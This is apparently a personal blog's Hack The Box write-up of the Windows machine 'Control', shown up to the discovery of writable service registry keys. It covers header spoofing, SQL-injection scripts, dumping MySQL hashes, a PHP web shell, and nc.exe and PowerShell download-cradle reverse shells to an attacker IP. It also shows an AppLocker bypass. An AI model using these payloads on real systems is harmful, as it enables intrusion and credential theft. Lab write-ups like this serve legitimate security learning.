---
layout: post
title:  "Control Writeup - Hack The Box"
date:   2025-07-23
desc: ""
keywords: "HTB,OSCP,OSWE,eWPT,Linux,HTTP Request Headers,SQLi,Scripting,ConPtyShell,ScriptBlocks,AppLocker Bypass,WinPEAS,Service ImagePath Hijacking,Hard"
categories: [HTB]
tags: [HTB,OSCP,OSWE,eWPT,Linux,HTTP Request Headers,SQLi,Scripting,ConPtyShell,ScriptBlocks,AppLocker Bypass,WinPEAS,Service ImagePath Hijacking,Hard]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/control_writeup/Control.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I continue my preparation with another beautiful **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, the setup of it and the methods to exploit its vulnerabilities are very creative, so I take with me a great feeling of satisfaction, besides all the concepts learned. The community rated this box as **Hard**, and the truth is that it deserves this valuation for its complexity because it requires advanced knowledge in some concepts related to it. The fact that it is a **Windows OS** machine adds a plus because it is my favorite target. I'm going to spawn the box and start my Writeup.

<br /><br />
<img src="{{ site.img_path }}/control_writeup/Control_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before starting the **Reconnaissance** phase, crucial in every lab, I will send a `ping` trace to the target machine to corroborate that I already have connectivity with it, also with `whichSystem.py`, a tool developed by **[hack4u](https://hack4u.io/){:target="_blank"}**, I can know the possible **OS** of the machine (**Windows**, my favorite target). Now I can use `nmap` and its basic **Reconnaissance** scripts, to first leak the list of open ports, then the services and their versions. I don't get a lot of information, but very interesting version data. My first research target is the **HTTP** protocol on port **80**, so with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I can disclose the technology stack behind the web application, the versions seem to be up to date, then I will deepen my research.

```bash
ping -c 1 10.10.10.167
whichSystem.py 10.10.10.167
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.167 -oG allPorts
nmap -sCV -p80,135,3306,49666 10.10.10.167 -oN targeted
cat targeted
# Microsoft IIS httpd 10.0
# MariaDB 10.3.24 or later
# 49666/tcp open  msrpc   Microsoft Windows RPC

whatweb http://10.10.10.167
# http://10.10.10.167/
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to start my research by exploring the **[RPC](https://book.hacktricks.wiki/en/network-services-pentesting/135-pentesting-msrpc.html?highlight=port%20135#identifying-exposed-rpc-services){:target="_blank"}** protocol, but unfortunately I do not have credentials and cannot access the system using `rpcclient`. If I use the script to perform an initial fingerprint scan of the web server I find a file available, but if I try to access the file using my browser, I get an error message informing me of a missing header. One task I always perform is to parse the source code, in which I find a comment related to the **SSL** certificate location path (the **IP** I will keep in mind). If I use `wfuzz` to look for the missing header, using a custom dictionary (after correcting my command) I find nothing at the moment.

> The **[Microsoft Remote Procedure Call](https://book.hacktricks.wiki/en/network-services-pentesting/135-pentesting-msrpc.html?highlight=port%20135#identifying-exposed-rpc-services){:target="_blank"}** (**MSRPC**) protocol, a client-server model enabling a program to request a service from a program located on another computer without understanding the network's specifics, was initially derived from open-source software and later developed and copyrighted by **Microsoft**.

```bash
rpcclient -U '' 10.10.10.167 -N

locate *.nse | grep http-enum
nmap --script http-enum -p80 10.10.10.167 -oN webScan
# /admin.php

# http://10.10.10.167/
# view-source:http://10.10.10.167/
# To Do:			- Enable SSL (Certificates location \\192.168.4.28\myfiles)   <-- What does it mean ?

curl -s -X GET http://10.10.10.167/admin.php | html2text
find /usr/share/SecLists \-name *headers* 2>/dev/null

cat /usr/share/SecLists/Miscellaneous/web/http-request-headers/http-request-headers-common-non-standard-fields.txt | head -n 4
wfuzz -c -w /usr/share/SecLists/Miscellaneous/web/http-request-headers/http-request-headers-common-non-standard-fields.txt -H "FUZZ" http://10.10.10.167/admin.php
wfuzz -c -w /usr/share/SecLists/Miscellaneous/web/http-request-headers/http-request-headers-common-non-standard-fields.txt -H "FUZZ: testing" http://10.10.10.167/admin.php
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/control_writeup/Control_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The comment I found in the source code comes back to my mind, so I'm going to use this data (the **IP**) in the header value I'm looking for with `wfuzz` and this way I succeed in finding the name (**[HTTP X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For){:target="_blank"}**) I was looking for. With `curl` I can access the web resource using the header I found and the value, using the **-H** flag, but to do it from the browser I have to use **BurpSuite** to catch the request, manually add the header and thus access the web resource.

> The **[HTTP X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For){:target="_blank"}** (**XFF**) request header is a de-facto standard header for identifying the **originating IP address** of a client connecting to a web server through a proxy server.

```bash
# view-source:http://10.10.10.167/
# 192.168.4.28

wfuzz -c -w /usr/share/SecLists/Miscellaneous/web/http-request-headers/http-request-headers-common-non-standard-fields.txt -H "FUZZ: 192.168.4.28" http://10.10.10.167/admin.php
# 000000022:   200        153 L    466 W      7933 Ch     "X-Forwarded-For"

curl -s -X GET http://10.10.10.167/admin.php -H 'X-Forwarded-For: 192.168.4.28'
curl -s -X GET http://10.10.10.167/admin.php -H 'X-Forwarded-For: 192.168.4.28' | html2text

burpsuite &> /dev/null & disown
# http://10.10.10.167/admin.php
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To avoid having the inconvenience of constantly modifying the application with **BurpSuite** to manually add the header, I am going to create a **rule** that performs the task of injecting the header automatically, this way I can continue my navigation in a more efficient way. The application has a feature that allows me to search for products and I immediately think of an attack via **SQLi**, since it is most likely interacting with a **Database Management System**. I confirm that the application is vulnerable to a simple injection, so I will resort to more elaborate injections to leak information from the database.

```html
# http://10.10.10.167/admin.php

burpsuite &> /dev/null & disown
# BurpSuite: Proxy settings --> HTTP match and replace rules --> Type (Request Header) & Replace (X-Forwarded-For: 192.168.4.28)

# Find Products
# 1, ' or 1=1-- -   :) Vulnerable to SQLi                         :)
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the use of some basic injections I can get information from the **DB**, but I will create a script to automate the **SQLi** exploitation. On my machine I have problems with the installation of some libraries like **pwn**, so I have to create a virtual environment for **Python** to install deprecated versions without problems. Once I have all the **Python** libraries that I'm going to use in my script I can continue with the coding.

```bash
nvim fidelity_sqli.py
python3 fidelity_sqli.py

python3 -m venv ./
./bin/pip3 install pwn
# :)

./bin/python3 fidelity_sqli.py
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The first thing I do is to catch again the request with **BurpSuite** to analyze what data I will need to send the request with the Python **requests** library, I need to know the name of the **.php** script in charge of interacting with the **DB**, the method used (**POST**), plus some headers and the name of the parameter where I perform the injection. In the first test of my script I use the **re** library to leak from the response obtained from the server, only the information I need. I run the tool and for the moment the results are as expected, I can continue improving its performance.

```bash
./bin/python3 fidelity_sqli.py
# l
# print(r.text)
# re.findall(r'<tr><td>1</td><td>2</td><td>(.*?)</td><td>4</td><td>5</td><td>6</td></tr>',r.text)
# re.findall(r'<tr><td>1</td><td>2</td><td>(.*?)</td><td>4</td><td>5</td><td>6</td></tr>',r.text)[0]

nvim fidelity_sqli.py
```

> **fidelity_sqli.py**:

```python
#!/usr/bin/python3

import pdb,requests
from pwn import *

def def_handler(sig,frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
sqli_url = "http://10.10.10.167/search_products.php"

def makeRequest(injection):

    headers = {"X-Forwarded-For": "192.168.4.28"}
    post_data = {
        'productName': "%s" % injection
    }

    r = requests.post(sqli_url, data=post_data,headers=headers)
#    pdb.set_trace()
    sqli_response = re.findall(r'<tr><td>1</td><td>2</td><td>(.*?)</td><td>4</td><td>5</td><td>6</td></tr>',r.text)[0]
    print("\n" + sqli_response + "\n")

if __name__ == "__main__":

    while True:
        injection = input("[+] Make your injection: ")

        if injection != 'exit':
            makeRequest(injection)
        else:
            print("\n\n[!] Exiting ...\n")
            exit(0)
```

```bash
./bin/python3 fidelity_sqli.py
rlwrap ./bin/python3 fidelity_sqli.py
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As the results obtained on the screen are not displayed in the best way, together with the **[hack4u](https://hack4u.io/){:target="_blank"}** community we were able to create a tool for **Bash**, which in addition to better display the results also allows you to perform the injections interactively. In addition, with the help of `rlwrap` we can further improve the interaction with the script. I perform the first injections to leak sensitive information and succeed in accessing the password hashes of the system users (this is my assumption). After sorting the information I try to crack the hashes with an online tool, **[CrackStation](https://crackstation.net/){:target="_blank"}**, and succeed in obtaining two passwords, but for the moment I do **not find them useful** to access the machine.

```bash
nvim fidelity_sqli.sh
chmod +x fidelity_sqli.sh
./fidelity_sqli.sh
./fidelity_sqli.sh -q "'union select 1,2,user(),4,5,6-- -"
./fidelity_sqli.sh -q "'union select 1,2,database(),4,5,6-- -"
./fidelity_sqli.sh -q "'union select 1,2,version(),4,5,6-- -"

nvim fidelity_sqli.sh
```

> **fidelity_sqli.sh**:

```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Exiting...${endColour}\n"
  tput cnorm; exit 1
}

# Ctrl+c
trap ctrl_c INT

# Global Variables
sqli_url="http://10.10.10.167/search_products.php"

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m]"

function makeInjection(){
  myInjection="$1"
  curl -s -X POST $sqli_url -H "X-Forwarded-For: 192.168.4.28" -d "productName=$myInjection" | awk '/<tbody>/,/<\/tbody>/' | html2text | awk NR==3
}

function makeInteractive(){
  while [ "$myInputInjection" != "exit" ]; do
    echo -ne "${redColour}[~]${endColour}${yellowColour} Injection ->${endColour} " && read -r myInputInjection
    echo; curl -s -X POST $sqli_url -H "X-Forwarded-For: 192.168.4.28" -d "productName=$myInputInjection" | awk '/<tbody>/,/<\/tbody>/' | html2text
  done    
}

function helpPanel(){
  echo -e "\n${yellowcolour}[+]${endcolor}${graycolour} use:${endcolour}\n"
  echo -e "\t${turquoiseColour}q)${endColor}${yellowColour} Injection to probe ${endColour}${purpleColour}[${endColour}${blueColour}Example: -q \"${endColour}${greenColour}' union select 1,2,3,4,5,6-- -${endColour}${blueColour}\"${endColour}${purpleColour}]${endColour}"
  echo -e "\t${turquoiseColour}i)${endColor}${yellowColour} Interactive Mode${endColour}"
  echo -e "\t${turquoiseColour}h)${endColor}${yellowColour} Show this help panel${endColour}"
  exit 1
}

declare -i parameter_counter=0; while getopts "q:ih" arg; do
  case $arg in
    q) myInjection=$OPTARG; let parameter_counter+=1;;
    i) let parameter_counter+=2;;
    h) helpPanel;;
  esac
done

# ./fidelity_sqli.sh -q "' union select 1,2,3,4,5,6-- -"

if [ $parameter_counter -eq 1 ]; then
  makeInjection "$myInjection"
elif [ $parameter_counter -eq 2 ]; then
  makeInteractive
else
  helpPanel
fi
```

```bash
./fidelity_sqli.sh -i
# ' union select 1,2,3,4,5,6-- -
# ' union select 1,2,user(),4,5,6-- -
# ' union select 1,2,database(),4,5,6-- -
# ' union select 1,2,version(),4,5,6-- -

# ' union select 1,2,schema_name,4,5,6 from information_schema.schemata-- -
# ' union select 1,2,schema_name,4,5,6 from information_schema.schemata limit 0,1-- -
# ' union select 1,2,schema_name,4,5,6 from information_schema.schemata limit 1,1-- -
# ' union select 1,2,schema_name,4,5,6 from information_schema.schemata limit 2,1-- -
# ' union select 1,2,schema_name,4,5,6 from information_schema.schemata limit 3,1-- -
# ' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
# ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="warehouse"-- -
# ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="mysql"-- -
# ' union select 1,2,group_concat(column_name),4,5,6 from information_schema.tables where table_schema="mysql" and table_name="user"-- -
# Injection -> ' union select 1,2,group_concat(User,0x3a,Password),4,5,6 from mysql.user-- -

echo "root:......9D" | tr ',' '\n' | sed 's/\*//g'

nvim hashes
cat hashes
cat hashes | tr -d '\n' | awk '{print $2}' FS=':' | xclip -sel clip
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Supported by **SQL** functionalities I'm going to try to **[upload a malicious file](https://portswigger.net/web-security/sql-injection/cheat-sheet){:target="_blank"}** on the web server, but first with `wfuzz` I succeed to find some directories (**uploads**) in which the files may be stored. I also investigate about the **[common paths in a Windows file system](https://security.stackexchange.com/questions/211594/local-file-inclusion-post-exploitation){:target="_blank"}** and use the one that is configured by **[default for IIS](https://serverfault.com/questions/281159/finding-the-root-for-a-windows-iis-server){:target="_blank"}**. I do a test by uploading a **.txt** file and from my browser I check that it was successfully uploaded to the server, so the next step is to upload one with **PHP** code to know if the code is interpreted. As the result is what I expected, I create a **PHP web shell** and upload it exploiting the **SQLi**, this way I can execute command remotely (**RCE**) and I can enumerate the system. But as my goal is to access the system, I will try to get a **Reverse Shell**, so first I will check the connectivity with my attacker machine with `ping`.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.167/FUZZ
# images, uploads, assets

rlwrap ./fidelity_sqli.sh -i
# ' union select 1,2,"olboy was here",4,5,6 INTO OUTFILE "c:\Inetpub\wwwroot\uploads\testing.txt"-- -
# ' union select 1,2,"olboy was here",4,5,6 INTO OUTFILE "c:\\Inetpub\\wwwroot\\uploads\\testing.txt"-- -

# http://10.10.10.167/uploads/testing.txt
# :)

# ' union select 1,2,"<?php echo \"PHP language interpretation\"; ?>",4,5,6 into outfile "c:\\Inetpub\\wwwroot\\uploads\\testing.php"-- -
# http://10.10.10.167/uploads/testing.php

# ' union select 1,2,"<?php echo \"<pre>\" . shell_exec($_REQUEST[\"cmd\"]) . \"</pre>\"; ?>",4,5,6 into outfile "c:\\Inetpub\\wwwroot\\uploads\\cmd.php"-- -
# http://10.10.10.167/uploads/cmd.php?cmd=whoami

#  - ..2,outfile(0x433a5c57696e646f77735c53797374656d33325c647269766572731b74635c686f737473),...
echo "C:/WINDOWS/System32/drivers/etc/hosts" | tr -d '\n'
echo "C:/WINDOWS/System32/drivers/etc/hosts" | tr -d '\n' | xxd -ps
echo "C:/WINDOWS/System32/drivers/etc/hosts" | tr -d '\n' | xxd -ps | xargs
echo "C:/WINDOWS/System32/drivers/etc/hosts" | tr -d '\n' | xxd -ps | xargs | tr -d ' '

tcpdump -i tun0 icmp -n
# http://10.10.10.167/uploads/cmd.php?cmd=ping%20-n%203%2010.10.14.5
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/control_writeup/Control_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To catch an incoming **Reverse Shell** with `nc` on port **443**, I will first perform a test by starting a local **SMB server** and using the **PHP web shell** to try to access shared resources on my attacking machine. The test is successful (I succeed to catch a **NTLMv2 hash** that I can try to crack offline), so I just need `nc.exe` to get a **Reverse Shell**, I start again the server with `impacket-smbserver` and enter the command in my browser to run `nc.exe`, this way I succeed to access the machine and run some basic enumeration commands. A script by **[Antonio Coco](https://github.com/antonioCoco/ConPtyShell){:target="_blank"}**, `ConPtyShell`, can help me to get a **Reverse Shell** with better performance, so I download the script on my machine and make a small modification to enter the **IP** and the **port** to which it should connect. Again I take advantage of the **PHP web shell** to import the `ConPtyShell` script, but my machine does not interact very well with the shell obtained so I go back to the previous one.

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
# http://10.10.10.167/uploads/cmd.php?cmd=\\10.10.14.5\smbFolder\test

locate nc.exe | grep -v al3j0
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap -cAr nc -nlvp 443
# http://10.10.10.167/uploads/cmd.php?cmd=\\10.10.14.5\smbFolder\nc.exe -e cmd 10.10.14.5 443
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1
nvim Invoke-ConPtyShell.ps1
cat Invoke-ConPtyShell.ps1 | tail -n 2
python3 -m http.server 80
nc -nlvp 443
# http://10.10.10.167/uploads/cmd.php?cmd=powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-ConPtyShell.ps1')
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/control_writeup/Control_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the first enumeration commands I find no special privileges that allow me to **Escalate privileges** or perform **user pivoting**, there are only two system users in addition to the typical Windows system accounts. But as I have the clear text password of **Hector's account** I try to migrate to this account using a **[script block](https://stackoverflow.com/questions/21345314/run-scriptblock-with-different-credentials){:target="_blank"}**, after correcting a small error in the declaration of the ```$username``` variable, I can execute commands impersonating the user **Hector**. I transfer to the target machine `nc.exe` to send a **Reverse Shell** to my attacker machine, but when I try to establish the connection I'm informed of a **permissions issue**, it is very likely that there are policies defined with **AppLocker** that are preventing me from doing so.

> A **[script block](https://stackoverflow.com/questions/21345314/run-scriptblock-with-different-credentials){:target="_blank"}** is a reusable **piece of code**, often enclosed in curly braces ```{}``` that can be executed as a single unit. In **PowerShell**, it's a fundamental concept for creating functions, handling events, and more. **Script blocks** can contain multiple statements or expressions, and they can be stored in variables, passed as arguments, or used as part of other commands like **Where-Object** or **ForEach-Object**.

> **[AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/what-is-applocker){:target="_blank"}** helps you create rules to allow or deny apps from running based on information about the apps' files. You can also use **AppLocker** to control which users or groups can run those apps.

> **Victime Machine**:

```cmd
whoami /priv
whoami /all
net user

powershell
hostname
# Fidelity

$username = 'hector@fidelity'
$password = 'l33th4x0rhector'
$SecPassword = ConvertTo-SecureString $password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential $username,$SecPassword
Invoke-Command -ComputerName localhost -Cred $Credential -ScriptBlock {whoami}
# [localhost] Connecting to remote server localhost failed with the following error message : Access is denied.  :(

$username = 'fidelity\hector'
$password = 'l33th4x0rhector'
$SecPassword = ConvertTo-SecureString $password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential $username,$SecPassword
Invoke-Command -ComputerName localhost -Cred $Credential -ScriptBlock {whoami}
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.5\smbFolder\nc.exe .\nc.exe
```

> **Attacker Machine**:

```bash
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
Invoke-Command -ComputerName localhost -Cred $SecCredential { C:\\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.5 443 }
# Program 'nc.exe' failed to run: Access is denied.       :(
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In order to get my **Reverse Shell** I'm going to resort to the list of directories available in the **[api0cradle Github](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md){:target="_blank"}** repository, to **bypass AppLocker**. In those directories I can upload the `nc.exe` binary and run it without restrictions, so once I do that I can already use a **Script Block** to succeed in catching the incoming **Reverse Shell** with `nc` on port **443**. I can now access the contents of the first flag and start a new stage of enumeration of the system but with the new compromised account, as I can't find much I'm going to automate the search with **[WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS){:target="_blank"}**. I will start a local **SMB server** to transfer `winPEAS.exe` (**obfuscated** version), but this time with credentials to avoid inconveniences when loading the binary on the target machine.

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.5\smbFolder\nc.exe C:\Windows\System32\spool\drivers\color\nc.exe

Invoke-Command -ComputerName localhost -Cred $SecCredential { C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.5 443 }

whoami
hostname
ipconfig

whoami /priv
whoami /all
net user hector

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
# ProductName    REG_SZ    Windows Server 2019 Standard
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/winPEASx64_ofs.exe .
mv winPEASx64_ofs.exe winPEAS.exe
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.5\smbFolder\winPEAS.exe .\winPEAS.exe
# :(
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFold $(pwd) -smb2support -username oldboy -password oldboy123
```

> **Victime Machine**:

```cmd
net use x: \\10.10.14.5\smbFold /u:oldboy oldboy123
dir x:\
copy x:\winPEAS.exe .\winPEAS.exe
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/control_writeup/Control_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I run `winPEAS.exe` and start my meticulous work to find possible attack vectors that allow me to **Escalate Privileges**, I find a lot of interesting information but the most important thing I found is that I have the ability to modify **service registry**, this may be a possible attack vector that I need.

> **Victime Machine**:

```cmd
.\winPEAS.exe
# PS history file: C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
# Looking if you can modify any service registry
# HKLM\system\currentcontrolset\services\seclogon (Hector [Allow: FullControl])     :)
```

<br />
<img src="{{ site.img_path }}/control_writeup/Control_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/control_writeup/Control_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
